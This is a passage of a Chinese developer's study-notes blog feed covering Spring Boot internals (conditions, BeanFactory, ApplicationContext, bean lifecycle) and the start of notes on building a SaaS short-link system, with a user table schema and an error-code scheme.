<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ((requiredPhase == null || requiredPhase == phase) &amp;&amp; !condition.matches(this.context, metadata)) &#123;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断是否跳过，跳过即不注册bean</p>
<p>其它的condition源码分析：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ProfileCondition：真正的内置的Condition接口的具体实现类</span><br><span class="line">SpringBootCondition-SpringBootCondition抽象了所有其具体实现类OnXXXCondition的共有逻辑--condition评估信息打印，最重要的是封装了一个模板方法getMatchOutcome(context, metadata)，留给各个OnXXXCondition具体子类去覆盖实现属于自己的判断逻辑，然后再返回相应的匹配结果给SpringBootCondition用于日志打印</span><br><span class="line"> OnResourceCondition</span><br><span class="line"> OnBeanCondition</span><br><span class="line"> OnWebApplicationCondition</span><br></pre></td></tr></table></figure>

<h2 id="4-SpringBoot自动配置实现"><a href="#4-SpringBoot自动配置实现" class="headerlink" title="4 -SpringBoot自动配置实现"></a>4 -SpringBoot自动配置实现</h2><p><a href="https://blog.csdn.net/TaloyerG/article/details/132479543">如何优雅地创建一个自定义的Spring Boot Starter_com.woniu.sayhiautoconfiguration-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_43522770/article/details/117284372">spring.factories 的妙用_spring.factories的作用-CSDN博客</a></p>
<p><a href="https://www.yuque.com/snailclimb/gepg7u/olbcna">4 SpringBoot是如何实现自动配置的？ (yuque.com)</a></p>
<h2 id="5-SpringBoot的配置属性值是如何绑定的"><a href="#5-SpringBoot的配置属性值是如何绑定的" class="headerlink" title="5-SpringBoot的配置属性值是如何绑定的"></a>5-SpringBoot的配置属性值是如何绑定的</h2><p><a href="https://www.yuque.com/snailclimb/gepg7u/pv6nlz">5 SpringBoot的配置属性值是如何绑定的？ (yuque.com)</a></p>
<h2 id="6-SpringBoot内置的各种Starter是怎样构建的"><a href="#6-SpringBoot内置的各种Starter是怎样构建的" class="headerlink" title="6-SpringBoot内置的各种Starter是怎样构建的"></a>6-SpringBoot内置的各种Starter是怎样构建的</h2><p><a href="https://www.yuque.com/snailclimb/gepg7u/dscr3a#a6397be7">6 SpringBoot内置的各种Starter是怎样构建的？ (yuque.com)</a></p>
<p><a href="https://github.com/jinyue233/mock-spring-boot-autoconfiguration">jinyue233&#x2F;mock-spring-boot-autoconfiguration: 模仿springboot内部结构自定义Starter。 (github.com)</a></p>
<p><a href="https://github.com/mybatis/spring-boot-starter/blob/master/mybatis-spring-boot-autoconfigure/src/site/zh_CN/markdown/index.md">spring-boot-starter&#x2F;mybatis-spring-boot-autoconfigure&#x2F;src&#x2F;site&#x2F;zh_CN&#x2F;markdown&#x2F;index.md at master · mybatis&#x2F;spring-boot-starter (github.com)</a></p>
<p>todo：读懂<a href="https://github.com/jinyue233/mock-spring-boot-autoconfiguration">jinyue233&#x2F;mock-spring-boot-autoconfiguration: 模仿springboot内部结构自定义Starter。 (github.com)</a>是怎样自定义starter的</p>
<p><a href="https://blog.csdn.net/inrgihc/article/details/109726583#:~:text=%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80.">springboot——@EnableConfigurationProperties使用与分析-CSDN博客</a></p>
<h1 id="黑马程序员视频"><a href="#黑马程序员视频" class="headerlink" title="黑马程序员视频"></a>黑马程序员视频</h1><h2 id="1-容器接口"><a href="#1-容器接口" class="headerlink" title="1.容器接口"></a>1.容器接口</h2><p>ctrl + ALT + 单击 ：跳转到实现</p>
<ul>
<li><p>BeanFactory 接口，典型功能有：</p>
<ul>
<li>getBean</li>
</ul>
<p>对应代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">BeanFactory</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">FACTORY_BEAN_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">getBean</span><span class="params">(String name)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(String name, Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    Object <span class="title function_">getBean</span><span class="params">(String name, Object... args)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(Class&lt;T&gt; requiredType)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; T <span class="title function_">getBean</span><span class="params">(Class&lt;T&gt; requiredType, Object... args)</span> <span class="keyword">throws</span> BeansException;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; ObjectProvider&lt;T&gt; <span class="title function_">getBeanProvider</span><span class="params">(Class&lt;T&gt; requiredType)</span>;</span><br><span class="line"></span><br><span class="line">    &lt;T&gt; ObjectProvider&lt;T&gt; <span class="title function_">getBeanProvider</span><span class="params">(ResolvableType requiredType)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">containsBean</span><span class="params">(String name)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isSingleton</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isPrototype</span><span class="params">(String name)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isTypeMatch</span><span class="params">(String name, ResolvableType typeToMatch)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isTypeMatch</span><span class="params">(String name, Class&lt;?&gt; typeToMatch)</span> <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    Class&lt;?&gt; getType(String name) <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    Class&lt;?&gt; getType(String name, <span class="type">boolean</span> allowFactoryBeanInit) <span class="keyword">throws</span> NoSuchBeanDefinitionException;</span><br><span class="line"></span><br><span class="line">    String[] getAliases(String name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>DefaultListableBeanFactory 是 其实现类。看pop up发现<img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240716185829687.png" alt="image-20240716185829687">有个</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/img_bed2@master/imgimage-20240716184505726.png" alt="image-20240716184505726"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DefaultSingletonBeanRegistry 里面有private final Map&lt;String, Object&gt; singletonObjects = new ConcurrentHashMap&lt;&gt;(256); 存的单例对象</span><br></pre></td></tr></table></figure></li>
</ul>
<p>具体查看单列对象代码(反射获取)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line"><span class="comment">//        context.getBean(&quot;aaa&quot;);</span></span><br><span class="line">        System.out.println(context);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">singletonObjects</span> <span class="operator">=</span> DefaultSingletonBeanRegistry.class.getDeclaredField(<span class="string">&quot;singletonObjects&quot;</span>);</span><br><span class="line">        singletonObjects.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> context.getBeanFactory();</span><br><span class="line">        Map&lt;String, Object&gt; map = (Map&lt;String, Object&gt;) singletonObjects.get(beanFactory);</span><br><span class="line">        map.forEach((k, v)-&gt;&#123;</span><br><span class="line">            System.out.println(k + <span class="string">&quot;=&quot;</span> + v);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<ul>
<li><p>ApplicationContext 接口，是 BeanFactory 的子接口。它扩展了 BeanFactory 接口的功能，如：</p>
<ul>
<li>国际化</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">    System.out.println(context.getMessage(<span class="string">&quot;hi&quot;</span>, <span class="literal">null</span>, Locale.CHINA));<span class="comment">//获取key 翻译后的结果</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通配符方式获取一组 Resource 资源</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">        System.out.println(context.getEnvironment().getProperty(<span class="string">&quot;server.port&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//8080 （需要在配置文件里面表示出来）</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//class path resource [application.preperties]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">        Resource[] resources = context.getResources(<span class="string">&quot;classpath*:META-INF/spring.factories&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (Resource resource : resources) &#123;</span><br><span class="line">            System.out.println(resource);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">URL [jar:file:/C:/Users/<span class="number">22536</span>/.m2/repository/org/springframework/boot/spring-boot/<span class="number">3.3</span><span class="number">.1</span>/spring-boot-<span class="number">3.3</span><span class="number">.1</span>.jar!/META-INF/spring.factories]</span><br><span class="line">URL [jar:file:/C:/Users/<span class="number">22536</span>/.m2/repository/org/springframework/boot/spring-boot-autoconfigure/<span class="number">3.3</span><span class="number">.1</span>/spring-boot-autoconfigure-<span class="number">3.3</span><span class="number">.1</span>.jar!/META-INF/spring.factories]</span><br><span class="line">URL [jar:file:/C:/Users/<span class="number">22536</span>/.m2/repository/org/springframework/spring-aop/<span class="number">6.1</span><span class="number">.10</span>/spring-aop-<span class="number">6.1</span><span class="number">.10</span>.jar!/META-INF/spring.factories]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> </span><br></pre></td></tr></table></figure>



<ul>
<li>整合 Environment 环境（能通过它获取各种来源的配置信息）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">        System.out.println(context.getEnvironment().getProperty(<span class="string">&quot;server.port&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//8080 （需要在配置文件里面表示出来）</span></span><br></pre></td></tr></table></figure>



<ul>
<li><p>事件发布与监听，实现组件之间的解耦</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">context.publishEvent(T); 发事件</span><br><span class="line"><span class="meta">@EventListener</span> 收事件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> SpringApplication.run(AlibabaStudyApplication.class, args);</span><br><span class="line">        context.publishEvent(<span class="keyword">new</span> <span class="title class_">Message</span>(<span class="string">&quot;hello , it&#x27;s me&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Message</span> &#123;</span><br><span class="line">    String info;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Message&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;info=&#x27;&quot;</span> + info + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Message</span><span class="params">(String info)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.info = info;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Compoment1</span> &#123;</span><br><span class="line">    <span class="meta">@EventListener</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testEventSendAndGet</span><span class="params">(Message message)</span>&#123;</span><br><span class="line">      log.info(message.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2024</span>-<span class="number">07</span>-16T19:<span class="number">26</span>:<span class="number">44.062</span>+08:<span class="number">00</span>  INFO <span class="number">21532</span> --- [alibabaStudy] [           main] com.example.alibabastudy.Compoment1      : Message&#123;info=<span class="string">&#x27;hello , it&#x27;</span>s me<span class="string">&#x27;&#125;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="2-容器实现"><a href="#2-容器实现" class="headerlink" title="2) 容器实现"></a>2) 容器实现</h2><ul>
<li>DefaultListableBeanFactory，是 BeanFactory 最重要的实现，像<strong>控制反转</strong>和<strong>依赖注入</strong>功能，都是它来实现</li>
<li>ClassPathXmlApplicationContext，从类路径查找 XML 配置文件，创建容器（旧）</li>
<li>FileSystemXmlApplicationContext，从磁盘路径查找 XML 配置文件，创建容器（旧）</li>
<li>XmlWebApplicationContext，传统 SSM 整合时，基于 XML 配置文件的容器（旧）</li>
<li>AnnotationConfigWebApplicationContext，传统 SSM 整合时，基于 java 配置类的容器（旧）</li>
<li>AnnotationConfigApplicationContext，Spring boot 中非 web 环境容器（新）</li>
<li>AnnotationConfigServletWebServerApplicationContext，Spring boot 中 servlet web 环境容器（新）</li>
<li>AnnotationConfigReactiveWebServerApplicationContext，Spring boot 中 reactive web 环境容器（新）</li>
</ul>
<p>面试题</p>
<h3 id="bean的生命周期"><a href="#bean的生命周期" class="headerlink" title="bean的生命周期"></a>bean的生命周期</h3><p><a href="https://blog.csdn.net/miles067/article/details/132587602">【spring】一文带你弄懂Spring Bean的生命周期（超详细，超级通俗易懂！！）_如何通俗易懂了解spring的bean的生命周期-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、实例化——依赖注入之前已经创建的java对象，但是Spring Bean对外不可用（相当于一个空壳  ）</span><br><span class="line"></span><br><span class="line">2、依赖注入</span><br><span class="line"></span><br><span class="line">                3、BeanNameAware BeanFactoryAware（类似的xxxaware方法）方法执行啦！（xxxAware可以让bean获取spring容器中的服务）</span><br><span class="line"></span><br><span class="line">        4、初始化前——BeanPostProcessor before方法</span><br><span class="line"></span><br><span class="line">                5、InitialingBean 接口的方法执行啦！</span><br><span class="line"></span><br><span class="line">6、初始化</span><br><span class="line"></span><br><span class="line">         7、初始化前——BeanPostProcessor after方法</span><br><span class="line"></span><br><span class="line">8、使用Bean</span><br><span class="line"></span><br><span class="line">        9、DisposableBean接口的方法执行啦！</span><br><span class="line"></span><br><span class="line">10、销毁Bean</span><br></pre></td></tr></table></figure>



<h3 id="三级缓存"><a href="#三级缓存" class="headerlink" title="三级缓存"></a>三级缓存</h3><h3 id="自动配置"><a href="#自动配置" class="headerlink" title="自动配置"></a>自动配置</h3><p>spring 和 spring boot的差别</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>源码</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>project_sass短链接系统</title>
    <url>/2024/10/05/project-sass%E7%9F%AD%E9%93%BE%E6%8E%A5%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<p><a href="https://wx.zsxq.com/group/51121244585524/topic/4844515884284858">【4星】SaaS短链接系统 - 适合新手从零视频学习，校&amp;社招均可面试-知识星球 (zsxq.com)</a></p>
<p>介绍：<a href="https://articles.zsxq.com/id_4rqwnwwtujir.html">什么是SaaS短链接系统？ (zsxq.com)</a></p>
<span id="more"></span>

<p>语雀文档：<a href="https://www.yuque.com/magestack/shortlink/dw576pf7huby4n1b">什么是SaaS短链接 (yuque.com)</a></p>
<p>视频地址：<a href="https://wx.zsxq.com/group/51121244585524/topic/4844515884284858">【4星】SaaS短链接系统 - 适合新手从零视频学习，校&amp;社招均可面试-知识星球 (zsxq.com)</a></p>
<p>[toc]</p>
<h2 id="快速开始"><a href="#快速开始" class="headerlink" title="快速开始"></a>快速开始</h2><h3 id="从零到一创建短链接项目及子模块项目"><a href="#从零到一创建短链接项目及子模块项目" class="headerlink" title="从零到一创建短链接项目及子模块项目"></a>从零到一创建短链接项目及子模块项目</h3><p><a href="https://blog.csdn.net/weixin_42114097/article/details/81391024"><a href="https://www.jianshu.com/p/e867ac845e11">Maven-dependencyManagement的使用 - 简书 (jianshu.com)</a></a></p>
<p>初始化及创建对应模块</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/cad5dce1282ba0d7385924e94802383062d001e0">初始化项目，包含一个父模块、三个子模块：project、admin、gateway · cad5dce · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="项目接口文档工具介绍"><a href="#项目接口文档工具介绍" class="headerlink" title="项目接口文档工具介绍"></a>项目接口文档工具介绍</h3><p>swagger对代码侵入性比较强。apifox小型项目要好些</p>
<p>apifox使用</p>
<h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="功能分析"><a href="#功能分析" class="headerlink" title="功能分析"></a>功能分析</h3><ul>
<li>检查用户名是否存在</li>
<li>注册用户</li>
<li>修改用户</li>
<li>根据用户名查询用户</li>
<li>用户登录</li>
<li>检查用户是否登录</li>
<li>用户退出登录</li>
<li>注销用户</li>
</ul>
<h3 id="数据库用户表设计"><a href="#数据库用户表设计" class="headerlink" title="数据库用户表设计"></a>数据库用户表设计</h3><p>数据库名叫link</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `t_user` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;ID&#x27;</span>,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">512</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;密码&#x27;</span>,</span><br><span class="line">  `real_name` <span class="type">varchar</span>(<span class="number">256</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;真实姓名&#x27;</span>,</span><br><span class="line">  `phone` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;手机号&#x27;</span>,</span><br><span class="line">  `mail` <span class="type">varchar</span>(<span class="number">512</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;邮箱&#x27;</span>,</span><br><span class="line">  `deletion_time` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;注销时间戳&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;修改时间&#x27;</span>,</span><br><span class="line">  `del_flag` tinyint(<span class="number">1</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT <span class="string">&#x27;删除标识 0：未删除 1：已删除&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br></pre></td></tr></table></figure>

<p>id为bigint是因为后续要考虑分库分表存雪花算法id</p>
<p>一些敏感数据存在数据是要加密的不仅仅是密码</p>
<h3 id="查询用户信息功能实现"><a href="#查询用户信息功能实现" class="headerlink" title="查询用户信息功能实现"></a>查询用户信息功能实现</h3><p>使用<a href="https://jully.top/generator/">凝聚力开发-JAVA代码生成平台 (jully.top)</a>生成对应实体类</p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/7878fc86efc945b8575b496a259acd49a1b8f5eb">feature:增加UserDo、UserRespDto、编写基本的service。实现了getUserByName接口 · 7878fc8 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>使用构造器注入注入service</p>
<h3 id="统一全局返回实体对象"><a href="#统一全局返回实体对象" class="headerlink" title="统一全局返回实体对象"></a>统一全局返回实体对象</h3><p><a href="https://blog.csdn.net/sunnyzyq/article/details/119992746">@Accessors 注解详解-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/f45a1d643c26fd7ac3a60bb26cc41094bd119cbd">feature:统一全局返回实体对象 · f45a1d6 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="业务全局异常码设计"><a href="#业务全局异常码设计" class="headerlink" title="业务全局异常码设计"></a>业务全局异常码设计</h3><p>Java开发手册（泰山版）：</p>
<p>1）错误码为字符串类型，共 5 位，分成两个部分：错误产生来源+四位数字编号。 </p>
<p>说明：错误产生来源分为 A&#x2F;B&#x2F;C。<strong>A 表示错误来源于用户，比如参数错误，用户安装版本过低，用户支付</strong> </p>
<p><strong>超时等问题；B 表示错误来源于当前系统，往往是业务逻辑出错，或程序健壮性差等问题；C 表示错误来源</strong> </p>
<p><strong>于第三方服务，比如 CDN 服务出错，消息投递超时等问题。</strong>四位数字编号从 0001 到 9999，大类之间的步长间距预留 100。</p>
<p>2）编号不与公司业务架构，更不与组织架构挂钩，一切与平台先到先申请的原则进行，审批生效，编号即被永久固定。</p>
<p>异常码分类：一级宏观错误码、二级宏观错误码、三级详细错误码。</p>
<p>对应例子：</p>
<p>客户端异常。</p>
<table>
<thead>
<tr>
<th>错误码</th>
<th>中文描述</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>A0001</td>
<td>用户端错误</td>
<td>一级宏观错误码</td>
</tr>
<tr>
<td>A0100</td>
<td>用户注册错误</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>A0101</td>
<td>用户未同意隐私协议</td>
<td></td>
</tr>
<tr>
<td>A0102</td>
<td>注册国家或地区受限</td>
<td></td>
</tr>
<tr>
<td>A0110</td>
<td>用户名校验失败</td>
<td></td>
</tr>
<tr>
<td>A0111</td>
<td>用户名已存在</td>
<td></td>
</tr>
<tr>
<td>A0112</td>
<td>用户名包含敏感词</td>
<td></td>
</tr>
<tr>
<td>xxx</td>
<td>xxx</td>
<td></td>
</tr>
<tr>
<td>A0200</td>
<td>用户登录异常</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>A02101</td>
<td>用户账户不存在</td>
<td></td>
</tr>
<tr>
<td>A02102</td>
<td>用户密码错误</td>
<td></td>
</tr>
<tr>
<td>A02103</td>
<td>用户账户已作废</td>
<td></td>
</tr>
<tr>
<td>xxx</td>
<td>xxx</td>
<td></td>
</tr>
</tbody></table>
<p>服务端异常。</p>
<table>
<thead>
<tr>
<th>错误码</th>
<th>中文描述</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>B0001</td>
<td>系统执行出错</td>
<td>一级宏观错误码</td>
</tr>
<tr>
<td>B0100</td>
<td>系统执行超时</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>B0101</td>
<td>系统订单处理超时</td>
<td></td>
</tr>
<tr>
<td>B0200</td>
<td>系统容灾功能被触发</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>B0210</td>
<td>系统限流</td>
<td></td>
</tr>
<tr>
<td>B0220</td>
<td>系统功能降级</td>
<td></td>
</tr>
<tr>
<td>B0300</td>
<td>系统资源异常</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>B0310</td>
<td>系统资源耗尽</td>
<td></td>
</tr>
<tr>
<td>B0311</td>
<td>系统磁盘空间耗尽</td>
<td></td>
</tr>
<tr>
<td>B0312</td>
<td>系统内存耗尽</td>
<td></td>
</tr>
<tr>
<td>xxx</td>
<td>xxx</td>
<td></td>
</tr>
</tbody></table>
<p>远程调用异常。</p>
<table>
<thead>
<tr>
<th>错误码</th>
<th>中文描述</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>C0001</td>
<td>调用第三方服务出错</td>
<td>一级宏观错误码</td>
</tr>
<tr>
<td>C0100</td>
<td>中间件服务出错</td>
<td>二级宏观错误码</td>
</tr>
<tr>
<td>C0110</td>
<td>RPC服务出错</td>
<td></td>
</tr>
<tr>
<td>C0111</td>
<td>RPC服务未找到</td>
<td></td>
</tr>
<tr>
<td>C0112</td>
<td>RPC服务未注册</td>
<td></td>
</tr>
<tr>
<td>xxx</td>
<td>xxx</td>
<td></td>
</tr>
</tbody></table>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/1367ac6bc8329e56e0904574d6af754d804d3edc">feature:业务全局异常码设计 · 1367ac6 · changchun&#x2F;shortlink - Gitee.com</a></p>
<h3 id="全局异常拦截器"><a href="#全局异常拦截器" class="headerlink" title="全局异常拦截器"></a>全局异常拦截器</h3><p><a href="https://blog.csdn.net/weixin_44299027/article/details/134862759">【Java用法】Lombok中@SneakyThrows注解的使用方法和作用_lombok.sneakythrows-CSDN博客</a></p>
<p>对应commit：<a href="https://gitee.com/xiong-changchun/shortlink/commit/5845ae98e67d5a588fdbcc7dfd7f4d00cf302901">feature:全局异常拦截器设计 · 5845ae9 · changchun&#x2F;shortlink - Gitee.com</a></p>
<p>但是前面的代码还是有问题，拦截不到页面不存在异常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">404错误是不经过Controller的，所以使用@ControllerAdvice或@RestControllerAdvice无法获取到404错误</span><br><span class="line">springboot2处理404错误的两种方式</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/hzhh123/p/10881356.html">springboot 2.x处理404、500等异常 - hzhh123 - 博客园 (cnblogs.com)</a></p>
<h3 id="用户敏感信息接口返回脱敏"><a href="#用户敏感信息接口返回脱敏" class="headerlink" title="用户敏感信息接口返回脱敏"></a>用户敏感信息接口返回脱敏</h3><p>通过jakson默认反序列化默认处理</p>
<p><a href="https://blog.csdn.net/RuanDongDong/article/details/121271205">Hutool - 信息脱敏工具 - DesensitizedUtil-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/ystyaoshengting/article/details/103731678">Jackson常用注解、自定义JsonSerializer、整合spring_jackson jsonserializer-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_41834086/article/details/111152470">Jackson之ObjectMapper对象的使用-CSDN博客</a></p>
